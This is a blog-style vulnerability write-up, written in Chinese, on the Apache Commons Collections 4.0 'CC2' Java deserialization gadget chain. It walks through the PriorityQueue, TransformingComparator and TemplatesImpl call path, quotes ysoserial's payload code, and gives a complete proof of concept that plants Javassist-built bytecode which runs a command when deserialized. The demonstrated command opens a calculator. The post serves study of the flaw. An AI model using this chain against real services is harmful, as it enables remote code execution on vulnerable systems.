@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Apache Commons Collections2 反序列化漏洞分析 - Da22le的博客</title><meta name="Description" content="好好学习 天天向上"><meta property="og:title" content="Apache Commons Collections2 反序列化漏洞分析" />
+<meta property="og:description" content="前言 继续学习cc链，重点在于新知识的学习和运用 环境搭建 创建maven项目，pox.xml修改为如下内容 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/apache-commons-collections2/" /><meta property="og:image" content="/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-28T16:50:30+08:00" />
+<meta property="article:modified_time" content="2022-02-28T16:50:30+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/logo.png"/>
+
+<meta name="twitter:title" content="Apache Commons Collections2 反序列化漏洞分析"/>
+<meta name="twitter:description" content="前言 继续学习cc链，重点在于新知识的学习和运用 环境搭建 创建maven项目，pox.xml修改为如下内容 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/apache-commons-collections2/" /><link rel="prev" href="/cve-2022-21350-weblogic-t3-rce/" /><link rel="next" href="/cve-2022-22947-spring-cloud-gateway-spel-rce/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Apache Commons Collections2 反序列化漏洞分析",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/apache-commons-collections2\/"
+        },"image": ["\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  3108 ,
+        "url": "\/apache-commons-collections2\/","datePublished": "2022-02-28T16:50:30+08:00","dateModified": "2022-02-28T16:50:30+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "Da22le","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Da22le"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Da22le的博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>Da22le</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/https:/github.com/Da22le" title="GitHub"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Da22le的博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>Da22le</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/https:/github.com/Da22le" title="GitHub"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Apache Commons Collections2 反序列化漏洞分析</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Da22le</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-28">2022-02-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3108 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 7 分钟&nbsp;<span id="/apache-commons-collections2/" class="leancloud_visitors" data-flag-title="Apache Commons Collections2 反序列化漏洞分析">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#前置知识">前置知识</a>
+      <ul>
+        <li><a href="#priorityqueue">PriorityQueue</a></li>
+        <li><a href="#javassist">Javassist</a></li>
+        <li><a href="#templatesimpl">TemplatesImpl</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="前言">前言</h1>
+<p>继续学习cc链，重点在于新知识的学习和运用</p>
+<h1 id="环境搭建">环境搭建</h1>
+<p>创建maven项目，pox.xml修改为如下内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;project xmlns=&#34;http://maven.apache.org/POM/4.0.0&#34;
+         xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
+         xsi:schemaLocation=&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+    &lt;groupId&gt;org.example&lt;/groupId&gt;
+    &lt;artifactId&gt;cc2&lt;/artifactId&gt;
+    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+
+    &lt;properties&gt;
+        &lt;maven.compiler.source&gt;7&lt;/maven.compiler.source&gt;
+        &lt;maven.compiler.target&gt;7&lt;/maven.compiler.target&gt;
+    &lt;/properties&gt;
+    &lt;build&gt;
+        &lt;plugins&gt;
+            &lt;plugin&gt;
+                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
+                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;
+                &lt;configuration&gt;
+                    &lt;source&gt;6&lt;/source&gt;
+                    &lt;target&gt;6&lt;/target&gt;
+                &lt;/configuration&gt;
+            &lt;/plugin&gt;
+        &lt;/plugins&gt;
+    &lt;/build&gt;
+    &lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+            &lt;version&gt;4.0&lt;/version&gt;
+        &lt;/dependency&gt;
+
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+            &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+            &lt;version&gt;3.25.0-GA&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+&lt;/project&gt;
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>这里jdk版本是7u80</p>
+</blockquote>
+<h1 id="前置知识">前置知识</h1>
+<h2 id="priorityqueue">PriorityQueue</h2>
+<ol>
+<li>PriorityQueue 是基于优先堆的一个无界队列，这个优先队列中的元素可以默认自然排序或者通过提供的Comparator 在队列实例化的时排序。</li>
+<li>PriorityQueue 不允许空值，而且不支持 non-comparable（不可比较）的对象，比如用户自定义的类。优先队列要求使用 Java Comparable 和 Comparator 接口给对象排序，并且在排序时会按照优先级处理其中的元素。</li>
+<li>PriorityQueue 的大小是不受限制的，但在创建时可以指定初始大小。当我们向优先队列增加元素的时候，队列大小会自动增加。</li>
+</ol>
+<h2 id="javassist">Javassist</h2>
+<p>Java 字节码以二进制的形式存储在 .class 文件中，每一个 .class 文件包含一个 Java 类或接口。Javaassist 就是一个用来 处理 Java 字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生成一个新的类对象，通过完全手动的方式。</p>
+<h2 id="templatesimpl">TemplatesImpl</h2>
+<ol>
+<li>TemplatesImpl 的属性<code>_bytecodes</code>存储了类字节码</li>
+<li>TemplatesImpl 类的部分方法可以使用这个类字节码去实例化这个类，这个类的父类需是 AbstractTranslet</li>
+<li>在这个类的无参构造方法或静态代码块中写入恶意代码，再借 TemplatesImpl 之手实例化这个类触发恶意代码</li>
+</ol>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>先来看一下ysoserial的gadget</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/*
+	Gadget chain:
+		ObjectInputStream.readObject()
+			PriorityQueue.readObject()
+				...
+					TransformingComparator.compare()
+						InvokerTransformer.transform()
+							Method.invoke()
+								Runtime.exec()
+ */
+</code></pre></td></tr></table>
+</div>
+</div><p>先进入到<code>java.util.PriorityQueue#readObject</code>中看一下，这里会进入到<code>heapify()</code>中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/a4d0e57e-eff7-df78-bd50-d3705e66eb96.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/a4d0e57e-eff7-df78-bd50-d3705e66eb96.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/a4d0e57e-eff7-df78-bd50-d3705e66eb96.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/a4d0e57e-eff7-df78-bd50-d3705e66eb96.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/a4d0e57e-eff7-df78-bd50-d3705e66eb96.png"
+        title="1.png" /></p>
+<p>跟进到<code>heapify()</code>中后，会进入到<code>siftDown()</code>中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1541cd96-6126-8b8f-b4b2-3592a834b1d1.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1541cd96-6126-8b8f-b4b2-3592a834b1d1.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1541cd96-6126-8b8f-b4b2-3592a834b1d1.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1541cd96-6126-8b8f-b4b2-3592a834b1d1.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1541cd96-6126-8b8f-b4b2-3592a834b1d1.png"
+        title="2.png" /></p>
+<p>继续跟进，如果<code>comparator</code>的值不为空则会进入到<code>siftDownUsingComparator()</code>中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1dc3e812-87f1-d8c1-125f-28e6abd69de0.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1dc3e812-87f1-d8c1-125f-28e6abd69de0.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1dc3e812-87f1-d8c1-125f-28e6abd69de0.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1dc3e812-87f1-d8c1-125f-28e6abd69de0.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1dc3e812-87f1-d8c1-125f-28e6abd69de0.png"
+        title="3.png" /></p>
+<p>在<code>siftDownUsingComparator()</code>方法中，会调用<code>comparator.compare()</code>方法去进行排序和对比，此时new一个<code>TransformingComparator</code>类型的对象，则会进入到<code>org.apache.commons.collections4.comparators.TransformingComparator#compare</code>中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/77a4c8f7-d9ad-1508-a647-9ad53051eee4.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/77a4c8f7-d9ad-1508-a647-9ad53051eee4.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/77a4c8f7-d9ad-1508-a647-9ad53051eee4.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/77a4c8f7-d9ad-1508-a647-9ad53051eee4.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/77a4c8f7-d9ad-1508-a647-9ad53051eee4.png"
+        title="4.png" /></p>
+<p>而在<code>org.apache.commons.collections4.comparators.TransformingComparator#compare</code>中，会去调用<code>this.transformer.transform()</code>，到这里应该就很熟悉了，在往下会去调用<code>org.apache.commons.collections4.functors.InvokerTransformer#transform</code>，可以通过反射去执行命令</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/41267a0c-8352-fde7-e446-e6beef404da3.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/41267a0c-8352-fde7-e446-e6beef404da3.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/41267a0c-8352-fde7-e446-e6beef404da3.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/41267a0c-8352-fde7-e446-e6beef404da3.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/41267a0c-8352-fde7-e446-e6beef404da3.png"
+        title="5.png" /></p>
+<p>下面是ysoserial的exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">public Queue&lt;Object&gt; getObject(final String command) throws Exception {
+	final Object templates = Gadgets.createTemplatesImpl(command);
+	// mock method name until armed
+	final InvokerTransformer transformer = new InvokerTransformer(&#34;toString&#34;, new Class[0], new Object[0]);
+
+	// create queue with numbers and basic comparator
+	final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));
+	// stub data for replacement later
+	queue.add(1);
+	queue.add(1);
+
+	// switch method called by comparator
+	Reflections.setFieldValue(transformer, &#34;iMethodName&#34;, &#34;newTransformer&#34;);
+
+	// switch contents of queue
+	final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &#34;queue&#34;);
+	queueArray[0] = templates;
+	queueArray[1] = 1;
+
+	return queue;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollections2.class, args);
+	}
+</code></pre></td></tr></table>
+</div>
+</div><p>这里大概的介绍一下整个流程，首先通过<code>Javassist</code>向<code>TemplatesImpl</code>的<code>_bytecodes</code>字段中加入想要执行的命令，然后通过反射将其加入到<code>PriorityQueue</code>队列中，到最后触发命令</p>
+<p>而其并不是和cc5一样通过反射去执行命令，而是触发<code>newTransformer</code>方法实例化恶意类达到命令执行的效果，在<code>newTransformer</code>方法中会进入到<code>getTransletInstance()</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/5de4d689-aaa7-432f-cc91-5edf8df6f46e.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/5de4d689-aaa7-432f-cc91-5edf8df6f46e.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/5de4d689-aaa7-432f-cc91-5edf8df6f46e.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/5de4d689-aaa7-432f-cc91-5edf8df6f46e.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/5de4d689-aaa7-432f-cc91-5edf8df6f46e.png"
+        title="6.png" /></p>
+<p>跟进到<code>getTransletInstance()</code>中，<code>_class == null</code>进入到<code>defineTransletClasses()</code>中，然后会将<code>_bytecodes</code>的值赋值给<code>_class</code>，然和返回到<code>getTransletInstance()</code>中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/61c44613-ce59-12a7-c5b9-38667bfa0358.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/61c44613-ce59-12a7-c5b9-38667bfa0358.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/61c44613-ce59-12a7-c5b9-38667bfa0358.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/61c44613-ce59-12a7-c5b9-38667bfa0358.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/61c44613-ce59-12a7-c5b9-38667bfa0358.png"
+        title="7.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/028ff439-2d47-e1e0-f903-d22d30e95ffd.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/028ff439-2d47-e1e0-f903-d22d30e95ffd.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/028ff439-2d47-e1e0-f903-d22d30e95ffd.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/028ff439-2d47-e1e0-f903-d22d30e95ffd.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/028ff439-2d47-e1e0-f903-d22d30e95ffd.png"
+        title="8.png" /></p>
+<p><code>_class.newInstance()</code>会对<code>_class</code>进行实例化，从而触发命令，这里是因为通过<code>Javassist</code>构造了一个恶意类，恶意类的内容为<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>，因此实例化时会执行命令</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/9ef94d69-e0c6-f7ed-0670-051e9dadb964.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/9ef94d69-e0c6-f7ed-0670-051e9dadb964.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/9ef94d69-e0c6-f7ed-0670-051e9dadb964.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/9ef94d69-e0c6-f7ed-0670-051e9dadb964.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/9ef94d69-e0c6-f7ed-0670-051e9dadb964.png"
+        title="9.png" /></p>
+<p><strong>POC如下：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+
+public class cc2 {
+    public static void main(String[] args) throws Exception {
+        String AbstractTranslet=&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;;
+        String TemplatesImpl=&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;;
+
+        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
+        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
+        CtClass payload=classPool.makeClass(&#34;CommonsCollections22222222222&#34;);//创建一个新的public类
+        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
+        payload.makeClassInitializer().setBody(&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;); //创建一个空的类初始化，设置构造函数主体为runtime
+
+        byte[] bytes=payload.toBytecode();//转换为byte数组
+
+        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl
+        Field field=templatesImpl.getClass().getDeclaredField(&#34;_bytecodes&#34;);//反射获取templatesImpl的_bytecodes字段
+        field.setAccessible(true);
+        field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组
+
+        Field field1=templatesImpl.getClass().getDeclaredField(&#34;_name&#34;);//反射获取templatesImpl的_name字段
+        field1.setAccessible(true);
+        field1.set(templatesImpl,&#34;test&#34;);//将templatesImpl上的_name字段设置为test
+
+        InvokerTransformer transformer=new InvokerTransformer(&#34;newTransformer&#34;,new Class[]{},new Object[]{});
+        TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
+        PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
+        queue.add(1);//添加数字1插入此优先级队列
+        queue.add(1);//添加数字1插入此优先级队列
+
+        Field field2=queue.getClass().getDeclaredField(&#34;comparator&#34;);//获取PriorityQueue的comparator字段
+        field2.setAccessible(true);
+        field2.set(queue,comparator);//设置queue的comparator字段值为comparator
+
+        Field field3=queue.getClass().getDeclaredField(&#34;queue&#34;);//获取queue的queue字段
+        field3.setAccessible(true);
+        field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl
+
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&#34;test.ser&#34;));
+        outputStream.writeObject(queue);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&#34;test.ser&#34;));
+        inputStream.readObject();
+
+    }
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>运行结果如下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dce432db-b9c6-a34c-fd06-5c857cb4d25d.png"
